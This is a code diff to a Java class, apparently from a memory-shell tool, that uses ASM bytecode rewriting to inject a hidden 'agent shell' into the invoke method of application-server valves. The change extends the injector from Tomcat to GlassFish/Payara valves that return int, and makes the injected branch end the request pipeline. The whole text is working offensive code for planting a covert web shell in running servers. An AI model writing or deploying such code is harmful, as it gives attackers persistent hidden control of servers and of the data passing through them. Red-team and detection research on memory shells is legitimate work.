@@ -76,9 +76,13 @@ public class TomcatContextValveAgentInjector extends ClassLoader implements Clas
             public MethodVisitor visitMethod(int access, String name, String descriptor,
                                              String signature, String[] exceptions) {
                 MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
-                if (TARGET_METHOD_NAME.equals(name) && descriptor.endsWith(")V")) {
+                // Tomcat uses void invoke; GlassFish/Payara uses int invoke (GlassFishValve)
+                if (TARGET_METHOD_NAME.equals(name)
+                        && (descriptor.endsWith(")V") || descriptor.endsWith(")I"))) {
                     Type[] argumentTypes = Type.getArgumentTypes(descriptor);
-                    return new TomcatContextValveAgentInjector.AgentShellMethodVisitor(mv, argumentTypes, getClassName());
+                    boolean returnsInt = descriptor.endsWith(")I");
+                    return new TomcatContextValveAgentInjector.AgentShellMethodVisitor(
+                            mv, argumentTypes, getClassName(), returnsInt);
                 }
                 return mv;
             }
@@ -88,11 +92,13 @@ public class TomcatContextValveAgentInjector extends ClassLoader implements Clas
     public static class AgentShellMethodVisitor extends MethodVisitor {
         private final Type[] argumentTypes;
         private final String className;
+        private final boolean returnsInt;
 
-        public AgentShellMethodVisitor(MethodVisitor mv, Type[] argTypes, String className) {
+        public AgentShellMethodVisitor(MethodVisitor mv, Type[] argTypes, String className, boolean returnsInt) {
             super(Opcodes.ASM9, mv);
             this.argumentTypes = argTypes;
             this.className = className;
+            this.returnsInt = returnsInt;
         }
 
         @Override
@@ -117,7 +123,13 @@ public class TomcatContextValveAgentInjector extends ClassLoader implements Clas
                     "(Ljava/lang/Object;)Z",
                     false);
             mv.visitJumpInsn(Opcodes.IFEQ, ifConditionFalse);
-            mv.visitInsn(Opcodes.RETURN);
+            // GlassFishValve.END_PIPELINE == 2
+            if (returnsInt) {
+                mv.visitInsn(Opcodes.ICONST_2);
+                mv.visitInsn(Opcodes.IRETURN);
+            } else {
+                mv.visitInsn(Opcodes.RETURN);
+            }
             mv.visitLabel(ifConditionFalse);
             mv.visitLabel(tryEnd);
             mv.visitJumpInsn(Opcodes.GOTO, skipCatchBlock);
